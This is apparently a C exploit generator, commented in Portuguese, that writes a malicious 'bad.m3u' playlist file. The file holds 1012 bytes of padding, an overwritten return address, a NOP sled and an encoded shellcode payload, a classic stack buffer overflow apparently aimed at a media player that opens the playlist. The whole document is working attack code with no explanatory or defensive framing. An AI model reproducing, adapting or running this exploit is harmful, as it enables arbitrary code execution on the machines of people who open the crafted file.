#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
	FILE *arquivo;
	unsigned char lixo[1013];
	unsigned char ret[] = "\x63\x3b\xfa\x77";
	unsigned char nops[17];
  unsigned char buf[] =    "\xdb\xd7\xbf\xbb\xa4\x92\xa1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
                          "\x52\x31\x7e\x17\x83\xee\xfc\x03\xc5\xb7\x70\x54\xc5\x50\xf6"
                          "\x97\x35\xa1\x97\x1e\xd0\x90\x97\x45\x91\x83\x27\x0d\xf7\x2f"
                          "\xc3\x43\xe3\xa4\xa1\x4b\x04\x0c\x0f\xaa\x2b\x8d\x3c\x8e\x2a"
                          "\x0d\x3f\xc3\x8c\x2c\xf0\x16\xcd\x69\xed\xdb\x9f\x22\x79\x49"
                          "\x0f\x46\x37\x52\xa4\x14\xd9\xd2\x59\xec\xd8\xf3\xcc\x66\x83"
                          "\xd3\xef\xab\xbf\x5d\xf7\xa8\xfa\x14\x8c\x1b\x70\xa7\x44\x52"
                          "\x79\x04\xa9\x5a\x88\x54\xee\x5d\x73\x23\x06\x9e\x0e\x34\xdd"
                          "\xdc\xd4\xb1\xc5\x47\x9e\x62\x21\x79\x73\xf4\xa2\x75\x38\x72"
                          "\xec\x99\xbf\x57\x87\xa6\x34\x56\x47\x2f\x0e\x7d\x43\x6b\xd4"
                          "\x1c\xd2\xd1\xbb\x21\x04\xba\x64\x84\x4f\x57\x70\xb5\x12\x30"
                          "\xb5\xf4\xac\xc0\xd1\x8f\xdf\xf2\x7e\x24\x77\xbf\xf7\xe2\x80"
                          "\xc0\x2d\x52\x1e\x3f\xce\xa3\x37\x84\x9a\xf3\x2f\x2d\xa3\x9f"
                          "\xaf\xd2\x76\x0f\xff\x7c\x29\xf0\xaf\x3c\x99\x98\xa5\xb2\xc6"
                          "\xb9\xc6\x18\x6f\x53\x3d\xcb\x50\x0c\x65\x89\x39\x4f\x95\x9c"
                          "\xe5\xc6\x73\xf4\x05\x8f\x2c\x61\xbf\x8a\xa6\x10\x40\x01\xc3"
                          "\x13\xca\xa6\x34\xdd\x3b\xc2\x26\x8a\xcb\x99\x14\x1d\xd3\x37"
                          "\x30\xc1\x46\xdc\xc0\x8c\x7a\x4b\x97\xd9\x4d\x82\x7d\xf4\xf4"
                          "\x3c\x63\x05\x60\x06\x27\xd2\x51\x89\xa6\x97\xee\xad\xb8\x61"
                          "\xee\xe9\xec\x3d\xb9\xa7\x5a\xf8\x13\x06\x34\x52\xcf\xc0\xd0"
                          "\x23\x23\xd3\xa6\x2b\x6e\xa5\x46\x9d\xc7\xf0\x79\x12\x80\xf4"
                          "\x02\x4e\x30\xfa\xd9\xca\x40\xb1\x43\x7a\xc9\x1c\x16\x3e\x94"
                          "\x9e\xcd\x7d\xa1\x1c\xe7\xfd\x56\x3c\x82\xf8\x13\xfa\x7f\x71"
                          "\x0b\x6f\x7f\x26\x2c\xba";

	memset(lixo,0,1013*sizeof(char));
	memset(nops,0,17*sizeof(char));
	memset(lixo,'A',1012*sizeof(char));
	memset(nops,'\x90',16*sizeof(char));
  
	arquivo = fopen("bad.m3u","wb");
	if(!arquivo)
	{
		printf("Nao foi possivel criar arquivo para escrita!");
		exit(1);
	}
  
	fwrite(lixo,1,1012,arquivo);
	fputs(ret,arquivo);
	fputs(nops,arquivo);
	fputs(buf,arquivo);
	fclose(arquivo);
  
	return 0;
}
